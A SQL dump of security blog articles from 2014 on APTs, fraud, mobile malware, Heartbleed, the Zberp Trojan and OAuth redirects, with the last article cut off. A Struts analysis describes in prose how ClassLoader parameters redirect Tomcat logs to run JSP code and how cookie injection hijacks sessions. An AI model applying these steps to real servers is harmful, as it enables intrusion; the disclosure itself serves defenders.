INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (520, '7 Recommendations for Defending against Advanced Persistent Threats (APTs)', 'Larry Ponemon', '2014-7-9', 'Is it possible to successfully defend your enterprise against  ? Ponemon Institute’s latest “ ” study, sponsored by Trusteer, an IBM company, revealed the pessimism that many IT security professionals feel about their ability to reduce the frequency and severity of these attacks. Most believe the security threat landscape is much more serious due to APTs, and we believe the study provides valuable insights into what those in the trenches are doing to keep their information assets safe. Their experiences can help other companies better understand where they should target their resources and energy to improve their defense. Based on the findings, here are some recommendations:', '\'Advanced Malware\', \'Advanced Persistent Threat (APT)\', \'Endpoint Security\', \'Java\'', 'https://securityintelligence.com/7-recommendations-for-defending-against-advanced-persistent-threats-apts/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (521, 'Cyber Criminals Never Sleep, Nor Should Your Fraud Prevention', 'Christopher Burgess', '2014-7-7', 'If you thought we’d ever catch a break from the onslaught of cyber crime, think again: Cyber criminals never sleep, and Senior Fraud Prevention Strategist   of Trusteer, an IBM company, illuminated this reality during his webinar “ .” Maor began his discussion with a bit of humor, demonstrating how a security team operating in isolation is doomed to work-arounds from both the constituency and the adversary with a visual: a security gate on a road with open field on either side. The visual shows tire ruts to the left and right of the gate, illustrating the fact that driving around the gate was just as effective as waiting for it to open. The cyber criminals are hoping that your company’s fraud prevention strategy is exactly like this gate. Why go through it when they can just drive around it? The growth of cyber crime and the ease with which cyber criminal syndicates are creating and proliferating their tools is demonstrative of the maturation of online crime. Criminals have evolved their mechanics to achieve a more holistic view with two end goals: monetization and expansion of capability. Maor shared two specific areas in which this is possible: the online/mobile banking landscape and intellectual property/business data. In the event of a hack of a consumer’s bank account, current U.S. banking procedures protect the consumer, but should a   to personally providing a wire transfer or similar to the criminal, that money is nonrecoverable. The banking procedures for businesses, however, are not so generous. A loss caused by a compromised infrastructure or an employee hack can be lethal for a small business. One   lost $1.3 million to organized criminals who accessed the 96 separate bank accounts controlled by the hospital. When the criminal was apprehended some time later, he noted that he would have taken more, but he did not have the means to launder or process the funds. \n Phishing is the art of getting someone to do something they may otherwise not have been inclined to do — setting the hook in the phish (the individual user), so to speak. Throughout the webinar, the recurring theme was   with multiple layers and steps. Criminals are working hard to  , but as good as they may be, a robust fraud prevention infrastructure coupled with user education goes a long way toward fraud prevention. Some of the areas worthy of approbation are: Maor visits cyber neighborhoods that the average user would not be able to begin to navigate. These neighborhoods operate on the unindexed “darknet” of the Internet. There, one can find the bazaars of the cyber criminals that provide stolen data or properties (personal identifying information or credit cards), tools and scripts for use (for a fee) and training sessions on how to use these tools, all created to be engaged when the bait hooks the target phish. The criminals’ arsenal of tools continues to mature and evolve. They are well aware that more fraud prevention entities are coming online and that more individuals are taking steps to protect their assets. The malicious tools presented during the webinar would induce heart palpitations for even the most seasoned business executives. The tools included: scripts to determine whether malware is detectable by specific anti-virus software, virtual hosting environments from which to launch the criminal activities, spoofing specific device nomenclature to give the “right responses” on what device is trying to access an environment and lessons on behavior. There is a common misconception that the cyber criminal is simply a “script kiddie” running scripts they bought online. While those who are caught can oftentimes be just that, advanced cyber criminals are well educated, have substantial resources and build tools and capabilities to guarantee their monetary flow for the long term; their investment in behavior-profiling countermeasures is indicative of this. One bank reported 1.5 million accounts were reviewed after 10 million login attempts. The cyber criminals did not attempt to conduct fraudulent behavior on the first login; indeed, they worked to season the account so that it would fall into the middle of the bell curve and not be considered an anomalous account worthy of attention from a fraud prevention specialist. As we move our banking from our laptops and desktops to our  , we should be asking, “Did I also migrate all the security protection I had in place on my laptop or desktop to my mobile device?” And for the organizations who are being touched by those mobile devices: Does your fraud prevention solution provide real-time intelligence to the analytic team? Are false positives minimized and the customer experience uninterrupted? When security becomes inconvenient, security becomes nonexistent, since users will quickly seek work-arounds. Thus, a decision must be made: Do you build your own solution or find a partner with experience and capability? The recent “ ” indicates that in 2013, there were  , which IBM’s analysts determined averages out to about 109 security incidents for the average company. How many security incidents did your company have? Would you even know? The   provides food for thought and a great deal of education on the arsenal of options available to those who wish to separate their funds or information from their persons and companies. The Cyber Security Intelligence report makes it very clear that the criminals are not going away. Knowing what you are up against is the first step; doing something about it needs to follow.', '\'Cybercrime\', \'Cybercriminals\', \'Fraud\', \'Fraud Prevention\'', 'https://securityintelligence.com/cyber-criminals-never-sleep-nor-should-your-fraud-prevention/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (522, 'Are Vendors Doing What Is Needed to Mitigate Security Vulnerabilities?', 'John Lucassen', '2014-6-30', 'When selecting an information technology (IT) vendor, it is important to consider what the vendor does to mitigate security vulnerabilities. Since no IT system or product can be made completely secure, you should expect your IT vendors to design their systems and products to be part of a comprehensive security approach that will also involve operational procedures and may even require other systems, products or services to be most effective.\n One important factor to consider is whether the vendor has a comprehensive approach to security. IT vendors are both consumers and developers of information technology, and should have policies and practices for addressing security in both domains:\n As an example of a vendor’s approach to security, IBM’s Secure Engineering Framework reflects best practices from across the company and directs its development teams to give proper attention to security during the development lifecycle. This framework is not only limited to development of IT products by the vendor, but can also be used to inform the development of IT solutions by the vendor’s customers. Additional information about IBM’s product security practices is available at IBM’s  .\n A key element of a vendor’s approach to security is its approach to Product Security   — how it manages the receipt, investigation and internal coordination of security vulnerability information related to its offerings, and how it provides a focal point for security researchers, industry groups, government organizations and vendors to report any suspected product security vulnerabilities.\n As an example of a vendor’s approach to incident response, IBM has a global PSIRT that performs these functions and provides a focal point for third parties to report to IBM any suspected IBM product security vulnerabilities.\n To better understand the numbers of published vulnerabilities for a particular vendor, here are a few points to consider:\n To put the number of vulnerabilities published by a particular vendor in context, consider how many products the vendor has.\n \n  To get a normalized view of product vulnerabilities, this figure shows the average number of vulnerabilities per product (the fewer, the better). As an example, as shown in this figure, IBM compares favorably to both the Top 5 and Top 50 vendors, according to data from  .\n Some vendors may only respond to vulnerabilities that are reported by their vendors, customers and third parties. Other vendors also proactively find and fix vulnerabilities. As an example, IBM uses security testing tools and methods, such as threat analysis (see  ), to proactively find and fix vulnerabilities.\n \n  In 1Q2014, about 20 percent of the   that affected IBM products were proactively discovered by IBM; another 20 percent were reported by customers or third parties; the remaining 60 percent were vulnerabilities in open-source and third-party software used by IBM products, according to the IBM X-Force report and IBM PSIRT.', '\'Application Security\', \'Information Technology (IT)\', \'IT Security\', \'vendors\', \'Vulnerabilities\'', 'https://securityintelligence.com/are-vendors-doing-what-is-needed-to-mitigate-security-vulnerabilities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (523, 'PC-Grade Malware Going Mobile', 'Assaf Regev', '2014-6-25', 'Today’s consumers have a wide variety of smartphones and tablets, several operating system choices and an abundance of security risks to manage. This ever-growing number of options greatly increases the likelihood of end users downloading and installing a suspicious app or simply being attacked by a social engineering campaign. According to   latest report on the evolution of mobile malware, there is a dramatic increase in the number of Android samples both on a daily and monthly basis. The number of daily gathered malware samples peaked at a staggering 1,500 samples. On a yearly scale, the overall number of Android malware samples crossed the 2 million mark in late 2013. Despite the overwhelming number of daily samples, it should be noted that Zeus still ranks in the top five attacks plaguing U.S. companies. Cyber criminals have advanced their attack methods on the mobile device; from bypassing the mobile device ID and cross-channel attacks leveraging one-time passwords (OTP) to mobile phishing and malware targeting mobile platforms, the   has progressed significantly in threat techniques targeting both devices and end users. Techniques such as cross-channel attacks, SMS forwarding, malware and phishing are all prevailing in the mobile channel because of inherent flaws in the operating systems and human error. Mobile devices can be infected when users access malicious or compromised websites with exploit codes that target mobile browser vulnerabilities, also known as “drive-by downloads.” In this case, a malicious application is downloaded and run transparently so that the user never sees any suspicious activity on the device. \n Recently, a targeted Android banking Trojan called   targeting Russian institutions was discovered, representing significant progression for mobile malware. SVPENG targets Android mobile applications by substituting an automatically-opened window with a phishing window designed to steal the victim’s login and password from the online banking system. Additionally, it creates an “overlay,” which consists of malware (already residing on the end user’s device) that continuously monitors whether a user is browsing to a bank’s website. Once the malware identifies that an online banking session is starting, it displays a screen on top of the browser, mimicking the look and feel of the bank’s website, but which is in fact a spoofed page. This probably sounds familiar: While not yet a true HTML injection, this is definitely a big step in that direction; mobile malware capabilities are quickly catching up with those of their PC-grade counterparts. Because mobility is evolving and traditional PC attack techniques are migrating to the mobile channel and introducing unique risks, a mobile fraud mitigation approach is essential. The platform must be highly adaptable to protect against ever-changing mobile threats in this rapidly growing channel. The expansion of mobile fraud methods together with the lack of security on mobile devices means that cyber criminals will increasingly target the mobile channel. It is clear that new mobile fraud mitigation techniques are essential in order to  .', '\'Android\', \'Banking\', \'Malware\', \'Mobile\', \'Mobile Malware\', \'Mobile Security\', \'Operating System (OS)\', \'SVPENG\', \'Trojan\'', 'https://securityintelligence.com/pc-grade-malware-going-mobile/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (524, 'Android KeyStore Stack Buffer Overflow: To Keep Things Simple, Buffers Are Always Larger Than Needed', 'Roee Hay', '2014-6-23', 'The vulnerability affects Android 4.3 only. Thanks for the Android Security Team for correcting our advisory. Nine months ago, my team came across a classic stack-based buffer overflow in the Android KeyStore service. As always, we adhered to our responsible disclosure policy and privately reported this issue to the Android Security Team; the result is a patch that is now available in KitKat. Considering Android’s fragmented nature and the fact that this was a code-execution vulnerability, we decided to wait a bit with the public disclosure. As an anecdote, the vulnerable source code file contains the following comment: Though things are simple, buffers are not always larger than the maximum space they needed. Android provides a secure storage service implemented by /system/bin/keystore. In the past, this service was accessible to other applications using a UNIX socket daemon found under /dev/socket/keystore; nowadays, however, it is accessible by the   interface. Each Android user receives his or her own secure storage area. A Blob is encrypted with AES using a master key, which is random, and is encrypted on-disk using a key that is derived from a password (the lock screen credentials) by the   function. In recent Android versions, credentials such as RSA private keys can be hardware-backed. This basically means that the keystore keys only serve as identifiers for the real keys backed by the hardware. Despite the hardware support, some credentials, such as VPN PPTP credentials, are still stored (encrypted) on-disk. The following diagram best illustrates the operation of the KeyStore service: More internals of KeyStore are available on the excellent series of posts ( ,  ,  ,  ,  ) by  . A stack buffer is created by the ‘KeyStore::getKeyForName’ method. This function has several callers, which are accessible by external applications using the Binder interface (e.g., ‘android::KeyStoreProxy::get’). Therefore, the ‘keyName’ variable can be controllable with an arbitrary size by a malicious application. As you can see, the ‘encode_key’ routine that is called by ‘encode_key_for_uid’ can overflow the ‘filename’ buffer, since bounds checking is absent: Exploiting this vulnerability can theoretically be done by a malicious application; however, a working exploit needs to overcome a combination of obstacles: However, the Android KeyStore is respawned every time it terminates. This behavior enables a probabilistic approach; moreover, the attacker may even theoretically abuse ASLR to defeat the encoding. Successfully exploiting this vulnerability leads to a malicious code execution under the keystore process. Such code can: Android 4.3. Android 4.4. Jun. 23, 2014 Public disclosure. \nNov. 11, 2013 Fix confirmed by Android Security Team. \nOct. 22, 2013 Updates requested from Android Security Team. \nSept. 9, 2013 Vulnerability acknowledged by Android Security Team. \nSept. 9, 2013 Private disclosure to Android Security Team. CVE-2014-3100 \nANDROID-10676015 We would like to thank Android Security Team for the efficient way in which they handled this security vulnerability.', '\'Android\', \'Buffer Overflow\', \'Vulnerabilty\'', 'https://securityintelligence.com/android-keystore-stack-buffer-overflow-to-keep-things-simple-buffers-are-always-larger-than-needed/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (525, 'The Pitfalls of Reusable Code: OpenSSL', 'Bryan Ivey', '2014-6-13', 'Ages ago, man invented the wheel. Some say this occurred around the second half of the fourth millennium BC. Since then, no one has needed to “reinvent” the wheel, just use it and improve on it. In many ways, software such as OpenSSL is like the wheel. Once a problem has been defined and a software solution is coded, debugged and tested, if it has been designed to be reusable, other applications can take advantage of the finished product. This reusable code is placed into “libraries” to make it easier to incorporate into other applications. Today’s open-source world has a large number of libraries available for use to make communications easier, file transfer possible and expedite a number of other functions. OpenSSL is one such library available to enable an application to communicate via Secure Sockets Layer (SSL) and Transport Layer Security (TLS) protocols. OpenSSL is based on an earlier library,  , developed by Eric A. Young and Tim J. Hudson. The software is freely available for use through the Apache-style license and can be used for personal or commercial purposes. As with any production-ready software package, OpenSSL was generally considered to be reliable. Created in 1988 as a library that offered a number of generic encryption/decryption subroutines, OpenSSL has been incorporated and used in a number of different applications, such as Web servers, virtual private networks (VPNs), tunneling applications, network file shares (NFSs), Java, Samba, SMTP servers, domain names servers (BIND) and others. In other words, for applications that need to communicate securely, it is more cost-effective for a company to use an existing, tried-and-true library than create their own from scratch. That is, until something like   is discovered. The vulnerability, identified as  , can result in the leaking of memory due to a bug in the way OpenSSL handles the TLS/DTLS heartbeat extension ( ). This extension provides the ability to perform a “keep-alive functionality without performing a renegotiation.” The original intent of the code was to allow a client (browser) to verify that the server was still present and available for requests. The client sends a packet to the server containing data and a size, supposedly, of the data being sent. The server takes that data and the size specified and returns a packet containing the dump of memory from the location it stored the incoming data for a period specified by the “size.” In a normal situation, the client might send “foxtrot” and the size “7” and that is what the client would receive back from the server. The Heartbleed incident exposed two issues: One, that a client did not need to have a prior connection to the server to be able to make a “heartbeat request,” and two, that the client did not have to be truthful when specifying the size of the data it wanted returned. This allowed an attacker, who had not entered into a prior session with the server, to send a heartbeat request to the server with “foxtrot” but specify that the size was up to 64K instead of only 7 bytes. Depending on where the server stored the incoming data (i.e., “foxtrot”), the server would start there and begin sending data until the specified size had been sent. Since the storage of the incoming data might coexist with memory used to decrypt the server’s private key, users’ passwords or other confidential data, this vulnerability represents a huge leak of potentially sensitive information. And because the   would not know where his data was stored nor potentially what might be stored in memory next, this attack might have to be carried out multiple times before any useful information was retrieved. In the early days of Heartbleed, CloudFlare issued a challenge to see if it was even possible to retrieve sensitive information using this method. Within nine hours of the challenge, two individuals   of the server to CloudFlare. One individual required approximately 2.5 million requests, and the other only sent in approximately 100,000 requests. Both individuals had returned the correct private key and had also demonstrated the randomness of the location data stored in memory on the server. Just when the Internet community was beginning to solve all of the issues from the Heartbleed incident, a new vulnerability,  , has been discovered. This vulnerability, a Man-in-the-Middle (MitM) attack, may be difficult to exploit. It requires that both the server and the client be vulnerable and that the attacker be able to   while they are en route to their destination. It requires that the attacker detect a new TLS connection and wait until after the ClientHello/ServerHello handshake messages are sent. The attacker would then send a Change CipherSpec (CCS) packet to both the client and the server. This request signifies that all future communication will be sent under a new CipherSpec and keys. This causes the OpenSSL code to generate a new secret key of length zero or, in other words, no secret key. The client and server then renegotiate the handshake parameters, and the attacker is able to decrypt or modify any future transactions. A decade ago, such an attack might only have been possible if the attacker was located on the client’s or server’s network or located at an Internet service provider (ISP) between the client and server. Now, with the proliferation of available  , such an attack becomes even more possible. This would require that the attacker either have control over such a public access point or set up his own to lure victims. No software package is considered bug-free, but OpenSSL’s 16 years of service does speak highly of the software. After the Heartbleed incident, the OpenSSL developers appealed to the Internet for assistance. As a volunteer project, resources were limited. As a result, a Linux Foundation project was created that promised to fund a security audit of the OpenSSL code base. In addition, the project would also fund the salaries of   dedicated to the OpenSSL project. IBM is one of the major vendors involved in supporting this project. The use of open-source projects, such as OpenSSL, means that companies can save development costs by not having to “reinvent” the wheel, as it were. It also means that they can take advantage of the years of code testing through its use in other products. And once in a while, maybe twice, it may mean an industry-wide scramble when that code does develop issues.', '\'Encryption\', \'Secure Sockets Layer (SSL)\'', 'https://securityintelligence.com/the-pitfalls-of-reusable-code-openssl/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (526, '2016: The Year of the Mega Breach', 'Michelle Alvarez', '2017-3-29', '“Excuse me, are you aware of what’s happening right now? We’re facing 20 billion security events every day. DDoS campaigns, ransomware, malware attacks …” says a woman sternly to an associate in a recently aired   featuring Watson and IBM Security. She may have been an actor, but the question and the threats she described plague real-world organizations and their security operations teams daily.   IBM X-Force knows the difficulties organizations face when it comes to finding time to step back from day-to-day operations to look at the big security picture. Because of this, they may be left with many unanswered questions, such as: \n Fortunately,   takes the guesswork out of assessing the security threat landscape for organizations with the IBM X-Force Threat Intelligence Index. To form assessments regarding the threat landscape, X-Force researchers draw on numerous data sources to include both data from monitored security clients — billions of events per year from more than 8,000 client devices in more than 100 countries — and data derived from noncustomer assets, such as spam sensors and honeynets. The following key trends point to a continued need to focus on security fundamentals. For a closer look at the full cyberthreat landscape for 2016, download the complete  .', '\'Data Breach\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Security Breach\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/underestimating-your-security-tactics-attackers-wont/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (527, 'Embracing the Uncertainty of Advanced Attacks Using Big Data Analytics', 'Zubair Ashraf', '2014-6-6', 'In my continuing series of  , I’d like to discuss two talks that center on using big data analytics to offset the uncertainty of advanced cyber attacks. The first is the keynote from the fourth annual   (HITB) security conference in Amsterdam by Eddie Schwartz ( ), who also coauthored the related paper  . The second is an RSA 2014 talk,   by Davi Ottenheimer ( ). Schwartz begins his keynote by referencing the movie and book Moneyball, using it to illustrate that fighting against advanced threats means we need to be looking at nontraditional metrics and data sets. He raises an interesting point that, traditionally, we have been spending a lot of time and financial resources on perimeter defense, but there is a lot of opportunity to   once the attacker has breached initial defenses and is busy in  . We need to be thinking about what sort of queries we can make to identify these activities. One of the challenges we have in identifying threats is that it is not about spotting an obvious looking problem;   are hard to identify and will blend well into the background. Big data analytics can help us with that. Using big data, we can start to see what is deviating from the norm. These problems can manifest themselves in a number of ways, including across domains, IP origins, checkout times, website browsing patterns, pipe names (for something at an OS level) and more. As we move into advanced threat analysis using big data, we are not only trying to recognize good versus bad, but we are examining the critical versus noncritical; what needs to be acted upon now versus what can wait. If we associate a dollar value to risk, what will we lose if we don’t act immediately? Both talks mention several challenges with using big data to  . They include the following: Another challenge that Ottenheimer identifies is the use of controls in big data environments and securing big data itself. This needs a whole new approach as we work on continuous collection of massive data sets, sharing them within and outside organizations, and across international boundaries. Not only do we have to care about availability of data, but also about securing the data itself. Schwartz mentions that although the traditional checklist model — white/black, good/bad — gives us certainty, we can’t ignore the uncertainty. We can use the collection, processing and querying of big data to deal with that uncertainty. At the same time, this does not mean that we go to the other extreme and throw out the traditional model completely. Ottenheimer gives the analogy of fighter pilots using checklists during takeoffs. They have a lot of value, but when an emergency situation arises, or they are engaged in fight, then more intelligent methods are needed. Intelligence driven security is the model that allows you to look at a huge collection of data in innovative and intelligent ways to identify misbehaving assets as soon as possible. One of the points that Schwartz mentioned is to start moving from   knowledge to big data deployment. He also talks about outsourcing and partnering for some of these roles, and says that companies should start asking partners and   about how they are adopting nontraditional analytics.', '\'Analytics\', \'Big Data\', \'Security Intelligence\'', 'https://securityintelligence.com/embracing-the-uncertainty-of-advanced-attacks-using-big-data-analytics/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (528, 'Meet the Zberp Trojan', 'Dana Tamir', '2014-5-22', 'Trusteer researchers recently discovered a new Trojan that has been targeting more than 450 financial institutions around the world, mainly in the U.S., U.K. and Australia. The new Trojan, which seems to be a variant of the well-known Zeus Trojan (a.k.a. Zbot), also demonstrates behaviors associated with the Carberp Trojan family. Therefore, we named it the   Trojan. According to an analysis conducted by Trusteer researchers   and  , the Trojan seems to have been assembled from the leaked source code of two well-known Trojans: Zeus and Carberp. The Zeus source code was exposed to the public in 2011, and it is already used by some criminal groups that customize its behavior and develop new features. The Carberp source code was  . “Since the source code of the Carberp Trojan was leaked to the public, we had a theory that it won’t take cyber criminals too long to combine the Carberp source code with the Zeus code and create an evil monster,” explained Korman and Darsan. “It was only a theory, but a few weeks ago we found samples of the ‘Andromeda’ botnet that were downloading the hybrid beast.” The new  , a variant of the Zeus VM Trojan, enables cyber criminals to grab basic information about the infected computer, including the Computer name, IP and more. It can take screen shots and send them to the attacker. It steals data submitted in HTTP forms, user SSL certificates and even FTP and POP account credentials. The Zberp Trojan also includes optional features that enable Web injections, dynamic Web injections, MITB/MITM attacks and VNC/RDP connections. In addition to its malicious capabilities, the Zberp Trojan uses a combination of evasion techniques that it inherited from both the Zeus and the Carberp Trojans. Zberp uses an “invisible persistence” feature that is has been used by the Zeus VM variant: the malware deletes its persistence key from the registry during the Windows startup process to prevent security solutions from detecting it during normal system scans that take place after the system boots. To ensure persistency, however, the malware rewrites the persistence key back to the registry during system shutdown. The Trojan also disguises the configuration code in an image file through steganography, a technique used by malware authors to embed code in a file format that looks legitimate and bypasses malware detection solutions.       The Carberp source code contribution to the Zberp Trojan can be seen in its “hooking” technique, commonly used by malware developers to control the browser, grab key strokes and steal information. It also keeps the malware “invisible,” evading detection by anti-virus and anti-malware tools. The figure below shows that the hook is implemented in the same place, but its implementation is slightly different: The push instruction highlighted in the Carberp code (on the left) was changed by one byte in the Zberp code (on the right), and a ‘mov’ instruction was added to it. These changes ensure that even security solutions capable of detecting Carberp variants will not identify the new code. Another evasion technique that has been embedded in the Zberp Trojan is the use of SSL, which secures the communications with the Command and Control server and evades detection by network security products. According to a Virus-Total scan, the Zberp Trojan was able to evade most anti-virus solutions when it was first detected. Trusteer’s endpoint protection solutions, which do not require prior knowledge about emerging threats in order to stop them, detected and removed the Zberp Trojan immediately — on ‘day zero.’', '\'Australia\', \'Malware\', \'Trojan\', \'Trusteer\', \'United Kingdom\', \'United States\', \'Vulnerabilities\', \'Zeus\'', 'https://securityintelligence.com/new-zberp-trojan-discovered-zeus-zbot-carberp/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (529, 'Analysis of Recent Struts Vulnerabilities in Parameters and Cookie Interceptors, Their Impact and Exploitation', 'Zubair Ashraf', '2014-5-16', 'Whitelisting and blacklisting are not easy to get right. We have seen this recently with the   and multiple back-to-back releases/security announcements  ,   and  ; this is something that has been observed in the   as well. I was recently involved in analyzing the   ClassLoader vulnerability (CVE-2014-0094) to provide guidance to our content development team on how to add coverage for this. During the analysis, it became clear that the solution and work-around proposed in the first announcment (blacklisting strings) was not complete. I continued my investigation further over the weekend, but by Monday, Apache had already been notified. They released S2-021 to cover CVE-2014-0112 and CVE-2014-0113 before I got around to sending them a write-up for these (of course, tweeting about these was quick and easy enough —  , and then  ). However, there was one more thing that they had missed; we sent them the disclosure write-up for it, which resulted in  . We have now released a   for this as well. During my conversations with internal and external teams, I realized that many people do not understand these vulnerabilities and that there is value in clarifying them via a blog entry. Discussing Struts in a bit more depth will help us to better understand these vulnerabilities and their impact. Basically, you have  , which you can think of as a Java class that implements certain interfaces and has certain properties (instance members/fields, etc). In a typical scenario before the action is executed, you have interceptors that process the requests; two of the interceptors that we are interested in are the   and the  . In general (although restrictions can be placed based on how they are configured), these interceptors will process the parameter names = value pairs from GET/POST requests and cookies, respectively. If the action has properties with these names and appropriate public get and set methods, they will set up those properties according to the values provided. For example, if you have parent.child.name = “SomeName” as part of your GET/POST request, and the action has these properties accessible via public get and set methods, then what the Parameters Interceptor will do is execute getParent().getChild.setName(“SomeName”). Note that parameter names are treated as OGNL statements, which means that there are multiple ways to do one thing; this is the main reason that the first blacklisting that Struts proposed was not complete (this has also been the cause of previous vulnerabilities in the Parameters Interceptor). The crux of the vulnerability is that these interceptors — in the absence of appropriate black- and whitelisting — lets an attacker get to the internal properties of Struts.   is about the ability to access a class instance of the action since getClass() is a public method available to all Java Objects. So what’s the big deal? Well, if you look at java.lang.Class, you will realize that, from there, you can get to ClassLoader via getClassLoader(); then, depending on the specific implementation of ClassLoader that the Web server running Struts is using to load Action classes, one may be able to get to other interesting properties and perhaps even modify some configuration settings of the Web server. We have seen one POC available in public that takes advantage of the   being used by Tomcat. The exploit works by modifying the configuraiton settings of Tomcat (via  ); more specifically, it changes the naming scheme of log files and the location where log files are stored to root directory, where Web application code is stored. Thereafter, when the attacker sends a request containing malicious script — such as a request containing JSP code — this will get logged into the log file, which now may have a name and extension of the attacker’s choice (e.g., file1.jsp). As this log file is now in WEBROOT or someplace from which the Web server serves pages containing JSP code, the attacker can then send a GET request for file1.jsp. When the Web server processes this file, it will execute the malicious code, and the attacker gets   on the Web server. Here are POC requests to the sample Struts blank application ( ). The requests below will change the log file location and naming convention: (Note: We are using  , but these requests can generally be sent via a browser as well) Then, if we send the request with jsp code, it gets stored into log file. Note that we are using Netcat to avoid URL encodings: Let’s take a look at the log file: Now if we request this log file, we will see xcalc starting up on the Linux box (i.e., we are able to execute arbitrary code on the Web server):   Notice xcalc being started from the Apache process (pid 1488). As mentioned above, the parameter names are treated as OGNL statements, which implies that all the following forms get us access to ClassLoader: class.classLoader, Class.classLoader, class[‘classLoader’], etc. Moreover, if an application uses Cookie Interceptor and allows any name/value to be used for a cookie, then the ClassLoader can be accessed via a cookie as well; these have been addressed by  . If you use Struts but do not use Tomcat, are you still vulnerable? Yes, you are! You may not have the same sort of exposure as Tomcat — and your deployment may not be exploitable — but there could be other interesting ways to exploit your deployment as well; the safest thing is to apply the patch. While analyzing CVE-2014-0094 and the initial patch released for it, I realized that class and Class both can be used to access the class instance, and the blacklisting was only forbidding class and not Class. As a natural consequence of this discovery, I realized that the other exclude parameter names on the list can also be bypassed by simply capitalizing their first character. Moreover, these can all be accessed via Cookie Interceptor, which, although it is not enabled by default, is still something that applications can and do use. Before I could complete my analysis and send Struts a write-up, S2-021 was released, and it took care of many of these issues. It proposed the following work-around: Note that they took care of excluding class and Class but did not do it for others like ‘session,’ ‘request,’ etc. Nevertheless, the way that they implemented the code fix ignored the case of the exclude parameters. However, what they missed was that these exclude parameters can also be modified via the Cookie Interceptor since they were just excluding the ‘class’ parameter for Cookie Interceptor and not ‘Session,’ etc. This is what we reported, and it was fixed with  . You may ask how we can exploit via ‘session’ and other parameters. This has been previously discussed  . Here is   to search on GitHub for applications implementing   with a public getSession() method available to access the Session object. One application that I found was using an action called  , and it has many different properties associated with the Session object. To demonstrate this vulnerability, we will use a dummy POC action such as:   We will add Cookie Interceptor when deploying this application as:   This is what the default page for our dummy Struts app looks like: We can now exploit the vulnerability as follows: This simple app uses JSESSIONID to track sessions. We will use Wget to fetch the default page and save cookies, which saves the JSESSIONID to file. We will then use this JSESSIONID and other cookies to modify the current user for this session and then send another request to fetch the default page using our injected cookies; we will see the server greeting us as an admin.   This is how the page fetched by Wget looks in-browser: We can learn and reemphasize many different lessons here, such as: The difficulty of getting black- and whitelisting right and the need to be very careful with it. Importance of careful code and patch reviews; this is not the first time that Struts had been affected by the same vulnerability in both Parameter and Cookie Interceptors. Finally, the importance of patching itself!', '\'Apache\', \'Struts\', \'Struts Vulnerabilities\', \'Vulnerabilities\'', 'https://securityintelligence.com/struts-vulnerabilities-analysis-parameters-cookie-interceptors-impact-exploitation/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (530, 'What You Need to Know about Security Flaw Found in OAuth and OpenID', 'Doug Franklin', '2014-5-8', 'A recently discovered a “Covert Redirect” weakness in the authentication processes used by the   and   authentication systems can allow attackers to subvert the authentication process to drive users to malicious websites. This security flaw proves both fascinating and difficult to assess at this point. The   and   technologies began with somewhat different intents, but they have now come to be used almost interchangeably. They allow end users on the Web to gain access to groups of websites through credentials hosted at one provider. In other words, they effectively provide federated authentication (single sign-on) for groups of Web properties; for example, you can use your Facebook credentials to access The Wall Street Journal or Pinterest. These authentication technologies operate differently from one another, and they certainly are not direct replacements for each other. The form of this weakness largely makes these differences irrelevant, though. To simplify the language of this article, I refer to OAuth 2.0 and OpenID collectively as authorization from here on out. The authorization “world” breaks down into three groups: The first segment mostly includes companies like Facebook and Google, for example, that offer authorization services. The second group includes third-party websites that allow authorization through the services. The third group comprises users providing their credentials to access the websites. When an Internet user visits a third-party website, the site determines the user’s authorization based on credentials hosted by the provider. The website expects that the provider has authenticated the user — has ensured that the user is who they claim to be. For example, quite a few websites will allow you access based on your Facebook credentials, as noted above. The authorization platform uses Internet redirection commands to provide this service. The basic exchange works like this: The weakness in this authentication process revolves around the URLs to which the provider will redirect a user after authentication. The redirection request from the website includes a field that tells the provider the URL to which the user should be redirected upon successful authentication, such as “http://example.com/check.” The Web code at that URL would check to ensure that the user authenticated properly, then dispatch them to the appropriate part of the site. The security flaw occurs when the site embeds the destination in the request. Suppose the site fills that field with something like “http://example.com/dispatch?http://example.com/landing.html.” Suppose further that the Web code simply strips off everything up to the “?” character and redirects the user to the URL that is left, known as an  . If adversaries can manipulate the contents of that URL, they can control the destinations of the redirects. This could cause a “ ” where users to “land” anywhere with an intact authentication token. The covert redirect could take them to a server performing advertising click fraud or a repository of drive-by download attacks, or it could deliver their session variables to a token harvester. With poorly designed sites, anything could be leaked for which the user has privileges. This attack requires satisfaction of two preconditions: Deny either of these preconditions and you eliminate the weakness. For most website operators, modifying the redirect Web code to perform some filtering or sanity checking on the inputs will thwart this attack. Other website operators might go so far as to redesign their redirection protocol to encode the destination differently or eliminate it from the request completely. Even after securing your site, though, you must ensure that it can’t be used to redirect to someone else’s open redirect. White lists offer an obvious choice to handle this problem; simple alternative designs work, too. For example, instead of passing a complete URL through the request arguments, a site might pass simply the path, with the redirect logic forcing the domain of the complete URL. The overall impact of this weakness remains hard to assess at this point. The security weakness is undeniably present, however; the open questions include how many websites operate open redirects and how many of them use susceptible data encoding. Though each open redirect presents a verifiable risk, just how many of them are there? What percentage of the total do they represent? How much traffic do they actually process? What data can the attacker obtain with an authentication token? Until we can answer these questions, we won’t be able to assess the overall risk. Unfortunately, the answers to some will vary depending on the design and implementation of the third-party websites. We can, however,  . As these systems proliferate, the operators must add “do not operate an open authorization redirect” as part of the canon of best practices. Fortunately, it does not represent much of 